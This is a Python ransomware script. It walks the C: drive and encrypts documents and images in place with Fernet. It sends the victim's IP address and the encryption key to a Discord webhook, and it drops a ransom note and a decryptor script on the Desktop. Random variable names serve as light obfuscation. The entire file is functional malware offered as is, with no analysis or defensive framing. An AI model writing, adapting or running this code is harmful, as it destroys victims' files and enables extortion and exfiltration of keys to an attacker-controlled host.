import os
import socket
from cryptography.fernet import Fernet
import requests
import threading
import time
import random
import string


def random_string(length=8):
    letters = string.ascii_letters
    return ''.join(random.choice(letters) for i in range(length))


ENCRYPTED_EXTENSIONS = [".txt", ".pdf", ".docx", ".jpg", ".xlsx"]

hostname_var = random_string()
ip_address_var = random_string()
all_files_var = random_string()
send_webhook_var = random_string()
encrypt_files_var = random_string()
create_files_var = random_string()
main_var = random_string()
webhook_thread_var = random_string()
get_valid_key_var = random_string()

globals()[hostname_var] = socket.gethostname()
globals()[ip_address_var] = socket.gethostbyname(globals()[hostname_var])

def get_all_files(start_path):
    file_list = []
    for root, dirs, files in os.walk(start_path):
        for file in files:
            if file in ["ransom_x.py", "ransom_y.py", "benioku.txt"]:
                continue
            if file.endswith(tuple(ENCRYPTED_EXTENSIONS)):
                file_list.append(os.path.join(root, file))
    return file_list

def send_webhook(webhook_url, message):
    attempt = 0
    while attempt < 7:
        try:
            response = requests.post(webhook_url, json={"content": message}, timeout=10)
            response.raise_for_status()
            return
        except requests.RequestException:
            attempt += 1
            time.sleep(5)

def webhook_thread(webhook_url, message):
    with threading.Lock():
        send_webhook(webhook_url, message)

def encrypt_files(file_list, key):
    fernet = Fernet(key)
    for file in file_list:
        try:
            with open(file, "rb") as the_file:
                contents = the_file.read()
                contents_encrypted = fernet.encrypt(contents)

            with open(file, "wb") as the_file:
                the_file.write(contents_encrypted)
        except Exception:
            continue

def create_files():
    desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")

    if not os.path.exists(desktop_path):
        try:
            os.makedirs(desktop_path)
        except Exception:
            pass

    readme_file_path = os.path.join(desktop_path, "benioku.txt")
    try:
        with open(readme_file_path, "w") as readme_file:
            readme_file.write("Your files have been encrypted.\nFollow the instructions to decrypt...")
    except Exception:
        pass

    decrypt_script_path = os.path.join(desktop_path, "ransom_y.py")
    try:
        with open(decrypt_script_path, "w") as decrypt_file:
            decrypt_file.write(f"""
import os
from cryptography.fernet import Fernet

ENCRYPTED_EXTENSIONS = {ENCRYPTED_EXTENSIONS}

def decrypt_file(file_path, key, output_directory):
    try:
        with open(file_path, "rb") as file:
            contents = file.read()

        fernet = Fernet(key)
        plaintext = fernet.decrypt(contents)

        file_name = os.path.basename(file_path)
        output_path = os.path.join(output_directory, file_name)

        with open(output_path, "wb") as file:
            file.write(plaintext)
    except Exception:
        pass

def decrypt_all_files(directory, key, output_directory):
    for root, dirs, files in os.walk(directory):
        for file in files:
            if file.endswith(tuple(ENCRYPTED_EXTENSIONS)) and file not in ["ransom_x.py", "ransom_y.py", "readme.txt"]:
                file_path = os.path.join(root, file)
                decrypt_file(file_path, key, output_directory)

def get_valid_key():
    while True:
        key_b64 = input("KEY: ")
        try:
            key = key_b64.encode()
            return key
        except ValueError:
            print("Please try again.")

if __name__ == "__main__":
    key = get_valid_key()
    desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")
    current_directory = os.getcwd()
    decrypt_all_files(current_directory, key, desktop_path)
""")
    except Exception:
        pass

def main():
    file_list = get_all_files("C:\\")
    key = Fernet.generate_key()
    key_content = key.decode()
    webhook_url = "https://discord.com/api/webhooks/"

    create_files()

    webhook_message = f"IP Address: {globals()[ip_address_var]}\nKey: {key_content}"
    thread = threading.Thread(target=webhook_thread, args=(webhook_url, webhook_message))
    thread.start()

    encrypt_files(file_list, key)

if __name__ == "__main__":
    main()
